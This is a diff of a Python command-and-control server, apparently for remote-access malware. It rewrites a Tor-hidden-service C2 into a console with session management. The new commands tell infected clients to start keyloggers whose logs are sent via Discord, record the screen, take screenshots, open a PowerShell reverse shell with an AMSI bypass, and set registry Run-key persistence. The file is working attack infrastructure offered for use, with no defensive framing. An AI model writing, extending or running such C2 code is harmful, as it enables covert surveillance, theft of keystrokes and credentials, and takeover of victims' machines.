@@ -1,53 +1,51 @@
 #!/usr/bin/env python3
 """
-C2 Server – works over Tor Hidden Service.
-Listens on 127.0.0.1:4443 – Tor forwards .onion traffic.
-TLS optional – you can comment out the wrap_socket part if you rely only on Tor.
+C2 Server – Final version with module control, session management, and interactive console.
 """
 import socket
+import ssl
 import threading
 import sys
 import time
-import ssl
+import json
 import os
+import base64
+from cmd import Cmd
 
 # ========== CONFIG ==========
-LISTEN_IP   = "127.0.0.1"          # bind only locally – Tor forwards to .onion
+LISTEN_IP = "127.0.0.1"
 LISTEN_PORT = 4443
-
-# TLS certificates – generate with:
-# openssl req -x509 -newkey rsa:2048 -keyout server.key -out server.crt -days 365 -nodes
 CERT_FILE = "server.crt"
-KEY_FILE  = "server.key"
-USE_TLS   = True                   # set False to use plain TCP (Tor alone is encrypted)
+KEY_FILE = "server.key"
+USE_TLS = True
 
 # ========== COLORS ==========
 RESET = "\033[0m"
 RED   = "\033[91m"
 GREEN = "\033[92m"
-YELLOW= "\033[93m"
+YELLOW = "\033[93m"
 CYAN  = "\033[96m"
-def color(text, code): return f"{code}{text}{RESET}"
+def color(text, code):
+    return f"{code}{text}{RESET}"
 
+# ========== SERVER CORE ==========
 class C2Server:
-    def __init__(self, host, port):
-        self.host = host
-        self.port = port
+    def __init__(self):
         self.sessions = {}          # sid -> socket
-        self.session_data = {}      # sid -> {addr, alive}
+        self.session_data = {}      # sid -> metadata
         self.counter = 0
         self.running = True
+        self.current_sid = None
 
     def start(self):
-        # Create base socket
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        sock.bind((self.host, self.port))
+        sock.bind((LISTEN_IP, LISTEN_PORT))
         sock.listen(5)
 
         if USE_TLS:
             if not (os.path.exists(CERT_FILE) and os.path.exists(KEY_FILE)):
-                print(color("[!] Certificate files missing. Run: openssl req -x509 -newkey rsa:2048 -keyout server.key -out server.crt -days 365 -nodes", YELLOW))
+                print(color("[!] Certificate missing. Generate with: openssl req -x509 -newkey rsa:2048 -keyout server.key -out server.crt -days 365 -nodes", RED))
                 sys.exit(1)
             context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
             context.load_cert_chain(certfile=CERT_FILE, keyfile=KEY_FILE)
@@ -55,14 +53,12 @@ class C2Server:
         else:
             self.server = sock
 
-        print(color(f"[*] C2 Server listening on {self.host}:{self.port}", GREEN))
-        if USE_TLS:
-            print(color("[*] TLS enabled", GREEN))
-        print(color("[*] Type 'help' for commands", CYAN))
-        threading.Thread(target=self.accept_connections, daemon=True).start()
-        self.command_loop()
+        print(color(f"[*] Server listening on {LISTEN_IP}:{LISTEN_PORT}", GREEN))
+        threading.Thread(target=self.accept_clients, daemon=True).start()
+        console = C2Console(self)
+        console.cmdloop()
 
-    def accept_connections(self):
+    def accept_clients(self):
         while self.running:
             try:
                 client, addr = self.server.accept()
@@ -79,13 +75,24 @@ class C2Server:
     def handle_client(self, sid):
         sock = self.sessions[sid]
         try:
-            sock.send(b"[+] Connected to C2 server\n")
+            sock.send(b"OK\n")   # initial handshake
             while self.running and self.session_data[sid]['alive']:
                 data = sock.recv(4096)
                 if not data:
                     break
-        except:
-            pass
+                # We handle JSON responses from the client (like screenshot data, etc.)
+                try:
+                    msg = json.loads(data.decode())
+                    if msg.get('type') == 'screenshot':
+                        # Save screenshot
+                        fname = f"screenshot_{sid}_{int(time.time())}.png"
+                        with open(fname, 'wb') as f:
+                            f.write(base64.b64decode(msg['data']))
+                        print(color(f"[*] Screenshot from session #{sid} saved as {fname}", GREEN))
+                except:
+                    pass
+        except Exception as e:
+            print(color(f"[!] Client #{sid} error: {e}", RED))
         finally:
             print(color(f"[-] Session #{sid} disconnected", RED))
             self.session_data[sid]['alive'] = False
@@ -94,53 +101,181 @@ class C2Server:
             except:
                 pass
 
-    def get_socket(self, sid):
-        if sid in self.sessions and self.session_data.get(sid, {}).get('alive', False):
+    def get_session(self, sid):
+        if sid in self.sessions and self.session_data.get(sid, {}).get('alive'):
             return self.sessions[sid]
         return None
 
-    def send_command(self, sid, cmd):
-        sock = self.get_socket(sid)
+    def send_command(self, sid, cmd, **kwargs):
+        sock = self.get_session(sid)
         if not sock:
-            print(color(f"[!] Session #{sid} not alive.", RED))
             return False
         try:
-            sock.send((cmd + "\n").encode())
-            print(color(f"[*] Command '{cmd}' sent to session #{sid}", YELLOW))
+            msg = {'cmd': cmd}
+            msg.update(kwargs)
+            sock.send((json.dumps(msg) + "\n").encode())
             return True
-        except Exception as e:
-            print(color(f"[!] Send error: {e}", RED))
-            self.session_data[sid]['alive'] = False
+        except:
             return False
 
-    def interactive_shell(self, sid):
-        sock = self.get_socket(sid)
-        if not sock:
-            print(color(f"[!] Session #{sid} not alive.", RED))
-            return
-        sock.send(b"shell\n")
-        print(color(f"[*] Entering interactive shell for session #{sid}. Type 'exit' to return.", CYAN))
+# ========== CONSOLE ==========
+class C2Console(Cmd):
+    intro = color("C2 Framework – type 'help' for commands.", CYAN)
+    prompt = color("C2> ", CYAN)
 
+    def __init__(self, server):
+        super().__init__()
+        self.server = server
+        self.current_sid = None
+
+    def emptyline(self):
+        pass
+
+    def do_list(self, arg):
+        """List active sessions"""
+        if not self.server.sessions:
+            print("No active sessions.")
+            return
+        print("Active sessions:")
+        for sid, data in self.server.session_data.items():
+            status = color("ALIVE", GREEN) if data['alive'] else color("DEAD", RED)
+            addr = data.get('addr', 'unknown')
+            print(f"  #{sid} – {addr} ({status})")
+
+    def do_use(self, arg):
+        """Select a session: use <id>"""
+        if not arg:
+            print("Usage: use <id>")
+            return
+        try:
+            sid = int(arg)
+            if sid in self.server.sessions and self.server.session_data[sid]['alive']:
+                self.current_sid = sid
+                print(f"Now using session #{sid}")
+            else:
+                print(f"Session #{sid} not alive or doesn't exist.")
+        except ValueError:
+            print("Invalid session ID.")
+
+    def do_sessions(self, arg):
+        """Alias for 'list'"""
+        self.do_list(arg)
+
+    def do_background(self, arg):
+        """Return to main prompt from an interactive session (not needed here)"""
+        pass
+
+    def do_help(self, arg):
+        """Show this help"""
+        print("Available commands:")
+        for attr in dir(self):
+            if attr.startswith('do_') and attr != 'do_help':
+                cmd = attr[3:]
+                doc = getattr(self, attr).__doc__
+                print(f"  {cmd:15} – {doc}")
+
+    # ---------- Module Control Commands ----------
+    def do_keylog_start(self, arg):
+        """Start the keylogger on the current session"""
+        if self.current_sid is None:
+            print("No session selected.")
+            return
+        if self.server.send_command(self.current_sid, 'keylog_start'):
+            print("Keylogger start command sent.")
+        else:
+            print("Failed to send command.")
+
+    def do_keylog_stop(self, arg):
+        """Stop the keylogger and retrieve logs"""
+        if self.current_sid is None:
+            print("No session selected.")
+            return
+        if self.server.send_command(self.current_sid, 'keylog_stop'):
+            print("Keylogger stop command sent. Logs will be sent via Discord.")
+        else:
+            print("Failed to send command.")
+
+    def do_screen_start(self, arg):
+        """Start screen recording (30s clips)"""
+        if self.current_sid is None:
+            print("No session selected.")
+            return
+        if self.server.send_command(self.current_sid, 'screen_start'):
+            print("Screen recording start command sent.")
+        else:
+            print("Failed to send command.")
+
+    def do_screen_stop(self, arg):
+        """Stop screen recording"""
+        if self.current_sid is None:
+            print("No session selected.")
+            return
+        if self.server.send_command(self.current_sid, 'screen_stop'):
+            print("Screen recording stop command sent.")
+        else:
+            print("Failed to send command.")
+
+    def do_screenshot_start(self, arg):
+        """Start scheduled screenshots (every 30s)"""
+        if self.current_sid is None:
+            print("No session selected.")
+            return
+        if self.server.send_command(self.current_sid, 'screenshot_start'):
+            print("Screenshot scheduling start command sent.")
+        else:
+            print("Failed to send command.")
+
+    def do_screenshot_stop(self, arg):
+        """Stop scheduled screenshots"""
+        if self.current_sid is None:
+            print("No session selected.")
+            return
+        if self.server.send_command(self.current_sid, 'screenshot_stop'):
+            print("Screenshot scheduling stop command sent.")
+        else:
+            print("Failed to send command.")
+
+    def do_screenshot(self, arg):
+        """Take a single screenshot and send to server (stores locally)"""
+        if self.current_sid is None:
+            print("No session selected.")
+            return
+        if self.server.send_command(self.current_sid, 'screenshot'):
+            print("Single screenshot command sent.")
+        else:
+            print("Failed to send command.")
+
+    def do_shell(self, arg):
+        """Spawn an interactive reverse shell (PowerShell with AMSI bypass)"""
+        if self.current_sid is None:
+            print("No session selected.")
+            return
+        # We'll override the console to enter shell mode
+        self.enter_shell_mode(self.current_sid)
+
+    def enter_shell_mode(self, sid):
+        sock = self.server.get_session(sid)
+        if not sock:
+            print("Session not alive.")
+            return
+        # Send shell command to client
+        if not self.server.send_command(sid, 'shell'):
+            print("Failed to start shell.")
+            return
+        print(f"Entering interactive shell on session #{sid}. Type 'exit' to return.")
+        # We'll create a thread to read from socket and print
         def reader():
-            buffer = ""
             while True:
                 try:
                     data = sock.recv(4096)
                     if not data:
                         break
-                    buffer += data.decode(errors='replace')
-                    while '\n' in buffer:
-                        line, buffer = buffer.split('\n', 1)
-                        sys.stdout.write(line + '\n')
-                        sys.stdout.flush()
+                    sys.stdout.write(data.decode(errors='replace'))
+                    sys.stdout.flush()
                 except:
                     break
-            if buffer:
-                sys.stdout.write(buffer)
-                sys.stdout.flush()
-
         threading.Thread(target=reader, daemon=True).start()
-
+        # Main thread sends user input
         while True:
             try:
                 cmd = input()
@@ -148,91 +283,41 @@ class C2Server:
                     break
                 sock.send((cmd + "\n").encode())
             except (KeyboardInterrupt, EOFError):
-                print(color("\n[!] Interrupted. Returning to C2 prompt.", RED))
+                print("\n[!] Interrupted.")
                 break
-            except Exception as e:
-                print(color(f"[!] Shell error: {e}", RED))
+            except:
                 break
-        print(color("[*] Shell session ended.", CYAN))
+        print("[*] Shell session ended.")
 
-    def list_sessions(self):
-        if not self.sessions:
-            print(color("No active sessions.", YELLOW))
+    def do_status(self, arg):
+        """Get status of modules on current session"""
+        if self.current_sid is None:
+            print("No session selected.")
             return
-        print(color("Active sessions:", CYAN))
-        for sid, data in self.session_data.items():
-            status = color("ALIVE", GREEN) if data['alive'] else color("DEAD", RED)
-            addr = data['addr']
-            print(f"  #{sid} – {addr[0]}:{addr[1]} ({status})")
+        if self.server.send_command(self.current_sid, 'status'):
+            print("Status request sent.")
+        else:
+            print("Failed to send command.")
 
-    def show_help(self):
-        print(color("\n=== C2 Server Commands ===", CYAN))
-        print("  list                          – show active sessions")
-        print("  use <id>                      – select a session")
-        print("  <cmd>                         – send start/stop/exit to current session")
-        print("  shell                         – spawn interactive reverse shell")
-        print("  bind <port>                   – tell client to start a bind shell on <port>")
-        print("  help                          – this help")
-        print("  quit                          – shutdown server")
+    def do_persistence(self, arg):
+        """Enable persistence on the target (registry Run key)"""
+        if self.current_sid is None:
+            print("No session selected.")
+            return
+        if self.server.send_command(self.current_sid, 'persistence'):
+            print("Persistence enable command sent.")
+        else:
+            print("Failed to send command.")
 
-    def command_loop(self):
-        current_sid = None
-        while self.running:
-            try:
-                line = input(color("C2> ", CYAN)).strip()
-                if not line:
-                    continue
-                parts = line.split()
-                cmd = parts[0].lower()
+    def do_exit(self, arg):
+        """Exit the server"""
+        self.server.running = False
+        print("Shutting down...")
+        sys.exit(0)
 
-                if cmd == "quit":
-                    self.running = False
-                    self.server.close()
-                    print(color("[*] Server shutting down.", GREEN))
-                    break
-                elif cmd == "help":
-                    self.show_help()
-                elif cmd == "list":
-                    self.list_sessions()
-                elif cmd == "use":
-                    if len(parts) < 2:
-                        print(color("Usage: use <session_id>", YELLOW))
-                        continue
-                    try:
-                        sid = int(parts[1])
-                        if sid in self.sessions and self.session_data.get(sid, {}).get('alive', False):
-                            current_sid = sid
-                            print(color(f"[*] Now using session #{sid}", GREEN))
-                        else:
-                            print(color(f"[!] Session #{sid} not alive or doesn't exist.", RED))
-                    except ValueError:
-                        print(color("[!] Invalid session ID.", RED))
-                elif cmd == "bind":
-                    if current_sid is None:
-                        print(color("[!] No session selected.", YELLOW))
-                        continue
-                    if len(parts) < 2:
-                        print(color("Usage: bind <port>", YELLOW))
-                        continue
-                    port = parts[1]
-                    self.send_command(current_sid, f"bind {port}")
-                elif cmd == "shell":
-                    if current_sid is None:
-                        print(color("[!] No session selected.", YELLOW))
-                        continue
-                    self.interactive_shell(current_sid)
-                else:
-                    if current_sid is None:
-                        print(color("[!] No session selected.", YELLOW))
-                        continue
-                    self.send_command(current_sid, cmd)
-            except (KeyboardInterrupt, EOFError):
-                print(color("\n[!] Exiting gracefully.", RED))
-                self.running = False
-                self.server.close()
-                break
-            except Exception as e:
-                print(color(f"[!] Error: {e}", RED))
+    def do_quit(self, arg):
+        self.do_exit(arg)
 
 if __name__ == "__main__":
-    C2Server(LISTEN_IP, LISTEN_PORT).start()
+    server = C2Server()
+    server.start()
